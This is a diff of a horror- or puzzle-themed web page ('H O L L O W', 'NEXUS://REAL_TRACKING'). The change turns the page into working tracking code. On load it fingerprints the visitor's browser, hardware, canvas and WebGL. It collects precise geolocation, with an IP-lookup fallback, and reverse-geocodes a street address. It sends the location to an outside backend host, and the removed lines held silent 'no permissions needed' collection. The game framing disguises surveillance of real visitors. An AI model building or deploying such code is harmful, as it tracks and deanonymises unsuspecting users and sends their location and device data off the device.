@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔮 NEXUS://REALITY_GLITCH</title>
+    <title>⚠️ H O L L O W ⚠️</title>
     <style>
         * {
             margin: 0;
@@ -11,696 +11,411 @@
             box-sizing: border-box;
         }
 
-        @keyframes corrupt {
-            0% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
-            10% { transform: translate(-10px, 10px) rotate(1deg); filter: hue-rotate(90deg) blur(2px); }
-            20% { transform: translate(10px, -10px) rotate(-1deg); filter: hue-rotate(180deg) blur(0px); }
-            30% { transform: translate(-5px, 5px) rotate(2deg); filter: hue-rotate(270deg) blur(3px); }
-            40% { transform: translate(5px, -5px) rotate(-2deg); filter: hue-rotate(360deg) blur(1px); }
-            50% { transform: translate(0) rotate(0deg); filter: hue-rotate(0deg) blur(0px); }
-        }
-
-        @keyframes flicker {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        @keyframes scan {
-            0% { transform: translateY(-100%); }
-            100% { transform: translateY(100%); }
-        }
-
-        @keyframes pulse-red {
-            0% { text-shadow: 0 0 5px #ff0000; }
-            50% { text-shadow: 0 0 30px #ff0000, 0 0 60px #8b0000; }
-            100% { text-shadow: 0 0 5px #ff0000; }
-        }
-
         body {
-            background: #000;
-            color: #0f0;
-            font-family: 'Courier New', 'VT323', monospace;
-            min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-            cursor: crosshair;
-            margin: 0;
-            padding: 10px;
-            background-image: 
-                repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, transparent 2px),
-                repeating-linear-gradient(90deg, rgba(255,0,0,0.03) 0px, transparent 2px);
-        }
-
-        .terminal {
-            background: rgba(0,20,0,0.9);
-            border: 2px solid #0f0;
-            box-shadow: 0 0 30px rgba(0,255,0,0.3);
-            padding: 20px;
-            margin: 20px;
-            position: relative;
-            backdrop-filter: blur(2px);
-        }
-
-        .terminal::before {
-            content: ">";
-            position: absolute;
-            left: -15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #0f0;
-            font-size: 24px;
-            animation: pulse-red 1s infinite;
-        }
-
-        .glitch-text {
-            font-size: clamp(1.2rem, 3vw, 2rem);
-            color: #0f0;
-            text-shadow: 
-                2px 2px 0 #ff0000,
-                -2px -2px 0 #0000ff;
-            animation: corrupt 5s infinite;
-            margin-bottom: 20px;
-        }
-
-        .data-stream {
+            background: #0a0a0a;
+            color: #00ff00;
             font-family: 'Courier New', monospace;
-            font-size: 10px;
-            color: #0f0;
-            line-height: 12px;
-            opacity: 0.5;
-            white-space: pre;
-            overflow: hidden;
-            height: 100px;
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            pointer-events: none;
-            z-index: 9999;
-        }
-
-        .matrix-rain {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            pointer-events: none;
-            z-index: 9998;
-            opacity: 0.1;
-        }
-
-        .grid-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
-            gap: 25px;
             padding: 20px;
-            max-width: 2000px;
+        }
+
+        .container {
+            max-width: 1400px;
             margin: 0 auto;
         }
 
-        .puzzle-card {
-            background: rgba(0,30,0,0.95);
-            border: 3px solid #0f0;
+        .header {
+            border: 2px solid #00ff00;
             padding: 20px;
-            transition: all 0.3s;
-            position: relative;
-            overflow: hidden;
-            min-height: 300px;
-            box-shadow: 0 0 50px rgba(0,255,0,0.2);
-        }
-
-        .puzzle-card:hover {
-            transform: scale(1.02);
-            border-color: #ff0000;
-            box-shadow: 0 0 80px rgba(255,0,0,0.4);
-        }
-
-        .puzzle-card::after {
-            content: "";
-            position: absolute;
-            top: -100%;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(transparent, rgba(0,255,0,0.1));
-            animation: scan 3s linear infinite;
-            pointer-events: none;
-        }
-
-        .card-header {
-            font-size: 1.5rem;
-            color: #0f0;
-            border-bottom: 2px dashed #0f0;
-            padding-bottom: 10px;
             margin-bottom: 20px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
+            background: rgba(0, 20, 0, 0.9);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
         }
 
-        .btn {
-            background: #000;
-            color: #0f0;
-            border: 3px solid #0f0;
-            padding: 15px 25px;
-            font-size: 1.2rem;
-            font-family: 'Courier New', monospace;
-            cursor: pointer;
-            transition: all 0.3s;
-            width: 100%;
-            margin: 10px 0;
-            position: relative;
-            overflow: hidden;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .btn:hover {
-            background: #0f0;
-            color: #000;
-            box-shadow: 0 0 50px #0f0;
-            transform: scale(1.05);
-        }
-
-        .btn.danger:hover {
-            background: #ff0000;
-            border-color: #ff0000;
-            box-shadow: 0 0 50px #ff0000;
-        }
-
-        .data-panel {
-            background: #000;
-            border: 2px solid #0f0;
-            padding: 15px;
-            font-size: 0.9rem;
-            max-height: 250px;
-            overflow-y: auto;
-            margin: 15px 0;
-            font-family: 'Courier New', monospace;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-
-        .location-grid {
+        .stats-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin: 15px 0;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
         }
 
-        .coord-display {
-            background: #000;
-            border: 2px solid #0f0;
-            padding: 10px;
-            text-align: center;
-            font-size: 1.5rem;
-            animation: flicker 2s infinite;
+        .stat-card {
+            border: 2px solid #00ff00;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.8);
         }
 
-        .camera-feed-container {
+        .satellite-container {
+            border: 2px solid #00ff00;
+            padding: 15px;
+            margin-bottom: 20px;
+            background: rgba(0, 0, 0, 0.8);
+        }
+
+        #satelliteMap {
             width: 100%;
-            height: 200px;
-            border: 4px solid #0f0;
-            position: relative;
-            overflow: hidden;
-            margin: 15px 0;
-            background: #000;
+            height: 400px;
+            border: 2px solid #00ff00;
+            margin-bottom: 10px;
+        }
+
+        .camera-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
         }
 
         .camera-feed {
+            border: 2px solid #00ff00;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.8);
+        }
+
+        .camera-feed img {
             width: 100%;
-            height: 100%;
-            object-fit: cover;
-            filter: grayscale(1) contrast(1.5);
-            transition: all 0.3s;
-        }
-
-        .feed-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(transparent 50%, rgba(0,255,0,0.1) 50%);
-            background-size: 100% 4px;
-            pointer-events: none;
-            z-index: 2;
-        }
-
-        .feed-info {
-            position: absolute;
-            bottom: 10px;
-            left: 10px;
-            background: rgba(0,0,0,0.8);
-            padding: 5px 10px;
-            border: 2px solid #0f0;
-            color: #0f0;
-            font-size: 0.8rem;
-            z-index: 3;
-        }
-
-        .threat-indicator {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            width: 200px;
             height: 200px;
-            border: 4px solid #0f0;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            background: rgba(0,0,0,0.9);
-            z-index: 9999;
-            animation: pulse-red 2s infinite;
+            object-fit: cover;
+            filter: grayscale(100%) contrast(1.2);
         }
 
-        .threat-number {
-            font-size: 3rem;
-            color: #ff0000;
+        .data-panel {
+            border: 2px solid #00ff00;
+            padding: 10px;
+            margin-top: 10px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
         }
 
-        .timeline {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            right: 20px;
-            height: 5px;
-            background: #0f0;
-            z-index: 9999;
-        }
-
-        .timeline-progress {
-            height: 100%;
-            width: 0%;
-            background: #ff0000;
-            transition: width 1s;
-        }
-
-        .hidden-message {
-            color: #000;
-            background: #000;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .hidden-message:hover {
-            color: #0f0;
-            background: transparent;
-        }
-
-        .puzzle-piece {
-            display: inline-block;
-            width: 50px;
-            height: 50px;
-            border: 2px solid #0f0;
+        .btn {
+            background: black;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            padding: 10px 20px;
             margin: 5px;
             cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
             transition: all 0.3s;
         }
 
-        .puzzle-piece.found {
-            background: #0f0;
-            box-shadow: 0 0 30px #0f0;
+        .btn:hover {
+            background: #00ff00;
+            color: black;
+            box-shadow: 0 0 20px #00ff00;
         }
 
-        .qr-container {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            justify-content: center;
-            margin: 20px 0;
+        .threat-meter {
+            width: 100%;
+            height: 30px;
+            border: 2px solid #00ff00;
+            margin: 10px 0;
+            position: relative;
         }
 
-        .qr-code {
-            width: 100px;
-            height: 100px;
-            background: repeating-linear-gradient(45deg, #000 0px, #000 10px, #0f0 10px, #0f0 20px);
-            border: 2px solid #0f0;
+        .threat-fill {
+            height: 100%;
+            background: #ff0000;
+            width: 0%;
+            transition: width 0.3s;
         }
 
-        .timeline-event {
-            position: absolute;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #0f0;
-            font-size: 0.8rem;
-            white-space: nowrap;
+        .coords {
+            font-size: 24px;
+            text-align: center;
+            margin: 10px 0;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        #terminal {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 400px;
+            height: 300px;
+            background: rgba(0, 0, 0, 0.95);
+            border: 2px solid #00ff00;
+            padding: 10px;
+            overflow-y: auto;
+            font-size: 12px;
+            z-index: 9999;
+        }
+
+        .terminal-line {
+            color: #00ff00;
+            margin: 2px 0;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
+        }
+
+        .glitch {
+            animation: glitch 1s infinite;
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(2px, -2px); }
+            60% { transform: translate(-2px, -2px); }
+            80% { transform: translate(2px, 2px); }
+            100% { transform: translate(0); }
         }
     </style>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 <body>
-    <!-- Matrix rain background -->
-    <canvas id="matrixCanvas" class="matrix-rain"></canvas>
-    
-    <!-- Threat indicator -->
-    <div class="threat-indicator">
-        <div>THREAT LEVEL</div>
-        <div class="threat-number" id="threatLevel">0</div>
-        <div id="threatMessage">SCANNING</div>
-    </div>
-
-    <!-- Timeline -->
-    <div class="timeline">
-        <div class="timeline-progress" id="timelineProgress"></div>
-        <div class="timeline-event" id="timelineEvent">INITIALIZING...</div>
-    </div>
-
-    <!-- Data stream -->
-    <div class="data-stream" id="dataStream"></div>
-
-    <!-- Main header -->
-    <div class="terminal" style="margin: 10px;">
-        <div class="glitch-text" id="mainHeader">> REALITY_GLITCH.exe // NEXUS v2.3.3.7</div>
-        <div id="systemTime" style="color: #0f0; font-size: 0.9rem;"></div>
-        <div id="coordinates" style="color: #0f0; font-size: 0.9rem;"></div>
-    </div>
-
-    <!-- Main puzzle grid -->
-    <div class="grid-container">
-        <!-- GEOLOCATION NEXUS -->
-        <div class="puzzle-card">
-            <div class="card-header">🌍 GEOLOCATION NEXUS</div>
-            <div class="location-grid">
-                <div class="coord-display" id="latitude">--.----</div>
-                <div class="coord-display" id="longitude">--.----</div>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1 class="glitch">🔮 NEXUS://REAL_TRACKING v1.0</h1>
+            <div id="userInfo"></div>
+            <div class="threat-meter">
+                <div class="threat-fill" id="threatLevel"></div>
             </div>
-            <div id="address" class="data-panel">Acquiring location data...</div>
-            <div id="nearbyPlaces" class="data-panel" style="max-height: 150px;"></div>
-            <button class="btn" id="forceLocation">🔍 FORCE SCAN</button>
+            <div id="coordinates" class="coords">--.--, --.--</div>
         </div>
 
-        <!-- SURVEILLANCE MATRIX -->
-        <div class="puzzle-card">
-            <div class="card-header">📡 SURVEILLANCE MATRIX</div>
-            <div class="camera-feed-container" id="cameraFeedContainer">
-                <img id="activeCameraFeed" class="camera-feed" src="" alt="Feed">
-                <div class="feed-overlay"></div>
-                <div class="feed-info" id="cameraInfo">No feed</div>
+        <!-- Stats Grid -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>📍 YOUR LOCATION</h3>
+                <div id="locationDetails">Acquiring...</div>
+                <button class="btn" onclick="getExactLocation()">📍 GET EXACT LOCATION</button>
             </div>
-            <div id="cameraList" class="data-panel" style="max-height: 150px;"></div>
-            <button class="btn" id="scanCameras">🎥 SCAN NETWORK</button>
-            <button class="btn" id="nextCamera">⏭️ NEXT FEED</button>
+            
+            <div class="stat-card">
+                <h3>💻 SYSTEM FINGERPRINT</h3>
+                <div id="systemDetails">Acquiring...</div>
+                <button class="btn" onclick="deepScan()">🔬 DEEP SCAN</button>
+            </div>
+            
+            <div class="stat-card">
+                <h3>🌐 NETWORK INFO</h3>
+                <div id="networkDetails">Acquiring...</div>
+            </div>
         </div>
 
-        <!-- SYSTEM FINGERPRINT -->
-        <div class="puzzle-card">
-            <div class="card-header">💻 SYSTEM FINGERPRINT</div>
-            <div id="sysInfo" class="data-panel"></div>
-            <button class="btn" id="deepScan">🔬 DEEP SCAN</button>
-            <div id="hardwareInfo" class="data-panel" style="display: none;"></div>
+        <!-- Satellite Imagery -->
+        <div class="satellite-container">
+            <h3>🛰️ LIVE SATELLITE IMAGERY</h3>
+            <div id="satelliteMap"></div>
+            <div style="display: flex; gap: 10px; margin-top: 10px;">
+                <button class="btn" onclick="refreshSatellite()">🔄 REFRESH</button>
+                <button class="btn" onclick="toggleSatelliteLayer()">🌍 TOGGLE LAYER</button>
+                <button class="btn" onclick="centerOnLocation()">🎯 CENTER ON ME</button>
+            </div>
+            <div id="satelliteInfo" class="data-panel"></div>
         </div>
 
-        <!-- THE BUTTON (DO NOT PRESS) -->
-        <div class="puzzle-card">
-            <div class="card-header">🚫 [REDACTED]</div>
-            <button class="btn danger" id="forbiddenButton">!!! DO NOT PRESS !!!</button>
-            <div id="pressHistory" class="data-panel"></div>
-            <div id="buttonMessages" class="data-panel" style="color: #ff0000;"></div>
+        <!-- Camera Network -->
+        <h3>📡 LIVE CAMERA NETWORK</h3>
+        <div class="camera-grid" id="cameraGrid"></div>
+
+        <!-- Data Panels -->
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+            <div class="stat-card">
+                <h3>🎲 REAL RANDOM NUMBERS</h3>
+                <div id="randomNumbers">-- -- -- -- --</div>
+                <button class="btn" onclick="generateRandom()">🎲 GENERATE (Quantum)</button>
+                <div id="randomSource" class="data-panel"></div>
+            </div>
+            
+            <div class="stat-card">
+                <h3>📨 ENCRYPTED MESSAGES</h3>
+                <div id="messages"></div>
+                <button class="btn" onclick="fetchMessages()">📩 FETCH</button>
+            </div>
         </div>
 
-        <!-- AUDIO FREQUENCY ANALYZER -->
-        <div class="puzzle-card">
-            <div class="card-header">🎵 AUDIO FREQUENCIES</div>
-            <canvas id="audioVisualizer" width="300" height="100" style="width:100%; height:100px; border:2px solid #0f0; margin:10px 0;"></canvas>
-            <button class="btn" id="playFrequency">🔊 TRANSMIT</button>
-            <input type="range" id="frequencySlider" min="20" max="2000" value="440" style="width:100%; margin:10px 0;">
-            <div id="audioMessage" class="data-panel"></div>
+        <!-- Terminal -->
+        <div id="terminal">
+            <div>>> NEXUS TERMINAL v1.0 <<</div>
+            <div id="terminalOutput"></div>
         </div>
-
-        <!-- NAME RITUAL -->
-        <div class="puzzle-card">
-            <div class="card-header">📝 NAME RITUAL</div>
-            <input type="text" id="ritualName" class="data-panel" placeholder="Enter name..." style="width:100%;">
-            <button class="btn" id="summonName">🔮 SUMMON</button>
-            <div id="nameResult" class="data-panel"></div>
-            <div id="nameHistory" class="data-panel" style="max-height: 100px;"></div>
-        </div>
-
-        <!-- ARCHIVE FOOTAGE -->
-        <div class="puzzle-card">
-            <div class="card-header">🏛️ ARCHIVE FOOTAGE</div>
-            <video id="archiveVideo" autoplay playsinline muted style="width:100%; height:150px; border:2px solid #0f0;"></video>
-            <div id="archiveLabel" class="data-panel">Loading...</div>
-            <button class="btn" id="nextArchive">🔄 NEXT FRAME</button>
-            <button class="btn" id="recordArchive">⏺️ RECORD</button>
-        </div>
-
-        <!-- QUANTUM RANDOMIZER -->
-        <div class="puzzle-card">
-            <div class="card-header">🌀 QUANTUM RANDOMIZER</div>
-            <div id="randomNumbers" class="data-panel">-- -- -- -- --</div>
-            <button class="btn" id="generateRandom">🎲 GENERATE</button>
-            <div id="quantumMessage" class="data-panel"></div>
-        </div>
-
-        <!-- CIPHER DECODER -->
-        <div class="puzzle-card">
-            <div class="card-header">🔐 CIPHER DECODER</div>
-            <textarea id="cipherInput" class="data-panel" placeholder="Enter cipher..." rows="2"></textarea>
-            <button class="btn" id="decodeCipher">🔓 DECODE</button>
-            <div id="cipherOutput" class="data-panel"></div>
-        </div>
-
-        <!-- TIMELINE ANOMALIES -->
-        <div class="puzzle-card">
-            <div class="card-header">⏳ TIMELINE ANOMALIES</div>
-            <div id="timelineEvents" class="data-panel"></div>
-            <button class="btn" id="scanTimeline">📅 SCAN TIMELINE</button>
-        </div>
-
-        <!-- COLLECTIBLES / PUZZLE PIECES -->
-        <div class="puzzle-card">
-            <div class="card-header">🧩 REALITY FRAGMENTS</div>
-            <div id="puzzlePieces" class="qr-container"></div>
-            <div id="fragmentsFound">0/9 fragments collected</div>
-        </div>
-
-        <!-- DEEP WEB NEXUS -->
-        <div class="puzzle-card">
-            <div class="card-header">🌐 DEEP WEB NEXUS</div>
-            <button class="btn" id="scrapeDarkWeb">💀 SCRAPE</button>
-            <div id="darkWebData" class="data-panel"></div>
-        </div>
-
-        <!-- CONSPIRACY GENERATOR -->
-        <div class="puzzle-card">
-            <div class="card-header">👁️ CONSPIRACY GENERATOR</div>
-            <button class="btn" id="generateTheory">🤔 GENERATE</button>
-            <div id="conspiracyText" class="data-panel"></div>
-        </div>
-
-        <!-- SATELLITE IMAGERY -->
-        <div class="puzzle-card">
-            <div class="card-header">🛰️ SATELLITE IMAGERY</div>
-            <img id="satelliteImage" class="camera-feed" src="" alt="Satellite" style="height:150px;">
-            <button class="btn" id="refreshSatellite">🔄 REFRESH</button>
-        </div>
-
-        <!-- ENCRYPTED MESSAGES -->
-        <div class="puzzle-card">
-            <div class="card-header">📨 ENCRYPTED MESSAGES</div>
-            <div id="encryptedMessages" class="data-panel"></div>
-            <button class="btn" id="newMessage">📩 RECEIVE</button>
-        </div>
-    </div>
-
-    <!-- Hidden footer with secrets -->
-    <div class="terminal" style="margin-top: 50px;">
-        <div style="text-align: center; color: #0f0; opacity: 0.5;" id="footerText">
-            > SYSTEM STATUS: [ACTIVE] // USERS ONLINE: <span id="onlineUsers">0000</span> // ENCRYPTION: [AES-256]
-        </div>
-        <div class="hidden-message" onclick="revealSecret(1)">[CLICK HERE FOR SECRET MESSAGE]</div>
     </div>
 
     <script>
-        // ==================== ADVANCED DATA COLLECTION (NO PERMISSIONS NEEDED) ====================
-        let collectedData = {
-            ip: null,
-            location: null,
-            browser: null,
-            system: null,
-            network: null,
-            hardware: null,
-            canvas: null,
-            webgl: null,
-            fonts: null,
-            plugins: null,
-            timezone: null,
-            language: null,
-            screen: null,
-            battery: null,
-            connection: null,
-            memory: null,
-            cores: null,
-            touchPoints: null,
-            cookies: null,
-            doNotTrack: null,
-            hardwareConcurrency: null,
-            deviceMemory: null,
-            maxTouchPoints: null,
-            vendor: null,
-            platform: null,
-            userAgent: null,
-            appVersion: null,
-            appName: null,
-            appCodeName: null,
-            product: null,
-            productSub: null,
-            vendorSub: null,
-            mimeTypes: null,
-            pdfViewerEnabled: null,
-            webdriver: null,
-            languages: null,
-            cookieEnabled: null,
-            onLine: null,
-            referrer: null,
-            historyLength: null,
-            localStorage: null,
-            sessionStorage: null,
-            indexedDB: null,
-            openDatabase: null,
-            cpuClass: null,
-            oscpu: null,
-            buildID: null,
-            mozSettings: null,
-            contry: null,
-            region: null,
-            city: null,
-            postal: null,
-            timezoneOffset: null,
-            dstOffset: null,
-            networkType: null,
-            networkSpeed: null,
-            networkRTT: null,
-            networkDownlink: null,
-            networkSaveData: null,
-            deviceOrientation: null,
-            devicePixelRatio: null,
-            colorDepth: null,
-            pixelDepth: null,
-            availWidth: null,
-            availHeight: null,
-            width: null,
-            height: null,
-            outerWidth: null,
-            outerHeight: null,
-            innerWidth: null,
-            innerHeight: null,
-            screenX: null,
-            screenY: null,
-            screenLeft: null,
-            screenTop: null
-        };
+        // ==================== CONFIGURATION ====================;
+        const BACKEND_URL = 'https://b-n1nt.onrender.com'; // Your FastAPI backend
 
-        // Puzzle system
-        let puzzlePieces = 0;
-        let buttonPresses = 0;
-        let timelineEvents = [];
-        let collectedNames = [];
-        let cameraIndex = 0;
-        let archiveIndex = 0;
+        // ==================== GLOBAL VARIABLES ====================
+        let map;
+        let satelliteLayer;
+        let currentLocation = null;
         let threatLevel = 0;
-        let secretMessages = [];
+        let userData = {};
 
-        // ==================== AUTO DATA COLLECTION ====================
-        async function collectAllData() {
-            // Basic browser data
-            collectedData.userAgent = navigator.userAgent;
-            collectedData.platform = navigator.platform;
-            collectedData.language = navigator.language;
-            collectedData.languages = navigator.languages.join(', ');
-            collectedData.cookieEnabled = navigator.cookieEnabled;
-            collectedData.doNotTrack = navigator.doNotTrack;
-            collectedData.hardwareConcurrency = navigator.hardwareConcurrency;
-            collectedData.deviceMemory = navigator.deviceMemory;
-            collectedData.maxTouchPoints = navigator.maxTouchPoints;
-            collectedData.vendor = navigator.vendor;
-            collectedData.appVersion = navigator.appVersion;
-            collectedData.appName = navigator.appName;
-            collectedData.appCodeName = navigator.appCodeName;
-            collectedData.product = navigator.product;
-            collectedData.productSub = navigator.productSub;
-            collectedData.vendorSub = navigator.vendorSub;
-            collectedData.pdfViewerEnabled = navigator.pdfViewerEnabled;
-            collectedData.webdriver = navigator.webdriver;
-            collectedData.onLine = navigator.onLine;
-            collectedData.referrer = document.referrer;
-            collectedData.historyLength = history.length;
+        // ==================== INITIALIZATION ====================
+        document.addEventListener('DOMContentLoaded', async () => {
+            await collectSystemInfo();
+            await getNetworkInfo();
+            initMap();
+            startTerminal();
+            await fetchCameras();
+            await fetchMessages();
+            
+            // Auto refresh every 30 seconds
+            setInterval(refreshSatellite, 30000);
+            setInterval(fetchCameras, 60000);
+        });
 
-            // Screen data
-            collectedData.screen = {
-                width: screen.width,
-                height: screen.height,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
-                orientation: screen.orientation?.type
-            };
+        // ==================== REAL LOCATION TRACKING ====================
+        async function getExactLocation() {
+            terminalLog('📍 Requesting exact location...');
+            
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    terminalLog('❌ Geolocation not supported');
+                    reject('Geolocation not supported');
+                    return;
+                }
 
-            // Window data
-            collectedData.window = {
-                innerWidth: window.innerWidth,
-                innerHeight: window.innerHeight,
-                outerWidth: window.outerWidth,
-                outerHeight: window.outerHeight,
-                devicePixelRatio: window.devicePixelRatio,
-                screenX: window.screenX,
-                screenY: window.screenY
-            };
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        currentLocation = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        };
 
-            // Timezone
-            collectedData.timezone = {
-                zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                offset: new Date().getTimezoneOffset(),
-                timestamp: Date.now(),
-                date: new Date().toString()
-            };
+                        document.getElementById('coordinates').textContent = 
+                            `${currentLocation.lat.toFixed(6)}, ${currentLocation.lon.toFixed(6)}`;
 
-            // Storage check
+                        // Reverse geocoding
+                        await reverseGeocode(currentLocation.lat, currentLocation.lon);
+                        
+                        // Update satellite view
+                        centerOnLocation();
+                        
+                        // Send to backend
+                        await sendToBackend('location', currentLocation);
+                        
+                        terminalLog(`✅ Location acquired (accuracy: ${currentLocation.accuracy.toFixed(1)}m)`);
+                        
+                        // Increase threat level
+                        updateThreatLevel(30);
+                        
+                        resolve(currentLocation);
+                    },
+                    (error) => {
+                        terminalLog(`❌ Location error: ${error.message}`);
+                        
+                        // Fallback to IP geolocation
+                        getIPLocation();
+                        reject(error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        // IP-based geolocation fallback
+        async function getIPLocation() {
+            terminalLog('🌐 Falling back to IP geolocation...');
+            
             try {
-                localStorage.setItem('test', 'test');
-                collectedData.localStorage = true;
-                localStorage.removeItem('test');
-            } catch {
-                collectedData.localStorage = false;
-            }
-
-            try {
-                sessionStorage.setItem('test', 'test');
-                collectedData.sessionStorage = true;
-                sessionStorage.removeItem('test');
-            } catch {
-                collectedData.sessionStorage = false;
-            }
-
-            // Network info
-            if ('connection' in navigator) {
-                const conn = navigator.connection;
-                collectedData.network = {
-                    type: conn.effectiveType,
-                    rtt: conn.rtt,
-                    downlink: conn.downlink,
-                    saveData: conn.saveData
-                };
-            }
-
-            // Battery info (silent)
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(battery => {
-                    collectedData.battery = {
-                        level: battery.level * 100,
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    currentLocation = {
+                        lat: data.lat,
+                        lon: data.lon,
+                        accuracy: 1000, // IP accuracy is low
+                        city: data.city,
+                        region: data.regionName,
+                        country: data.country,
+                        zip: data.zip,
+                        isp: data.isp
                     };
-                });
+                    
+                    document.getElementById('coordinates').textContent = 
+                        `${currentLocation.lat.toFixed(6)}, ${currentLocation.lon.toFixed(6)}`;
+                    
+                    document.getElementById('locationDetails').innerHTML = `
+                        <b>IP Location (Fallback)</b><br>
+                        City: ${data.city}<br>
+                        Region: ${data.regionName}<br>
+                        Country: ${data.country}<br>
+                        ZIP: ${data.zip}<br>
+                        ISP: ${data.isp}<br>
+                        <small>Accuracy: ~1km</small>
+                    `;
+                    
+                    centerOnLocation();
+                    await sendToBackend('location', currentLocation);
+                    terminalLog(`📍 IP Location: ${data.city}, ${data.country}`);
+                }
+            } catch (error) {
+                terminalLog(`❌ IP location failed: ${error.message}`);
             }
+        }
 
-            // Canvas fingerprinting (silent)
+        // Reverse geocoding
+        async function reverseGeocode(lat, lon) {
+            try {
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                const data = await response.json();
+                
+                document.getElementById('locationDetails').innerHTML = `
+                    <b>Exact Location</b><br>
+                    Address: ${data.display_name || 'Unknown'}<br>
+                    Lat: ${lat.toFixed(6)}<br>
+                    Lon: ${lon.toFixed(6)}<br>
+                    Accuracy: ${currentLocation.accuracy.toFixed(1)}m<br>
+                    Altitude: ${currentLocation.altitude || 'N/A'}m
+                `;
+                
+                terminalLog(`📍 Address: ${data.display_name?.substring(0, 50)}...`);
+            } catch (error) {
+                console.error('Reverse geocoding failed:', error);
+            }
+        }
+
+        // ==================== SYSTEM FINGERPRINTING ====================
+        async function collectSystemInfo() {
+            terminalLog('💻 Collecting system fingerprint...');
+            
+            userData = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                maxTouchPoints: navigator.maxTouchPoints,
+                vendor: navigator.vendor,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                referrer: document.referrer || 'direct',
+                timestamp: new Date().toISOString()
+            };
+
+            // Canvas fingerprinting
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = 200;
@@ -709,167 +424,214 @@
                 ctx.textBaseline = 'top';
                 ctx.font = '14px Arial';
                 ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillRect(10, 10, 100, 100);
                 ctx.fillStyle = '#069';
-                ctx.fillText('Hello, world!', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.fillText('Hello, world!', 4, 17);
-                collectedData.canvas = canvas.toDataURL();
-            } catch (e) {
-                collectedData.canvas = 'error';
-            }
+                ctx.fillText('FINGERPRINT', 20, 50);
+                userData.canvasFingerprint = canvas.toDataURL().substring(0, 100);
+            } catch (e) {}
 
             // WebGL fingerprinting
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
